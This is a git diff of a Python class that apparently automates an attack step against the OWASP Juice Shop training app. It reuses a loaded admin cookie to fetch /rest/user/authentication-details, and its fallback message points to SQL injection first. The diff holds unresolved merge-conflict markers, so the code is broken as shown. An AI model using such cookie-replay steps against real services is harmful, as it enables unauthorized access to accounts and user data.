@@ -6,9 +6,10 @@ class admin_section(a.attack_inter):
     def __init__(self):
         # First trying to load cookies from local cookie file
         self.juice_session = a.requests.session()
-        self.url = a.URL + '/rest/user/authentication-details/'
+        self.url = a.URL + '/rest/user/authentication-details'
 
     def generator(self):
+<<<<<<< HEAD
         cookie = a.load_cookie()
         header = HEADER
         return cookie,header
@@ -19,8 +20,27 @@ class admin_section(a.attack_inter):
             response = self.juice_session.get(self.url, cookies=cookie, headers=header)
             print(response.text)
             if response.status_code == 304:
+=======
+        header = a.HEADER
+
+        cookie = a.load_cookie('admin')
+        return cookie, header
+
+    def run(self):
+
+        cookie,header = self.generator()
+        print("1")
+        if cookie:
+            print("2")
+            response = self.juice_session.get(self.url, cookies=cookie, headers=header ,verify=False)
+            print("3")
+            #print(response.text)
+            if response.status_code == 304 or response.status_code == 200:
+                print("4")
+>>>>>>> master
                 print("successfully get admin dashboard")
                 print(response.text)
             print(response.status_code)
         else:
             print("Not have authentification yet, please try SQL injection first")
+            print("2.1")
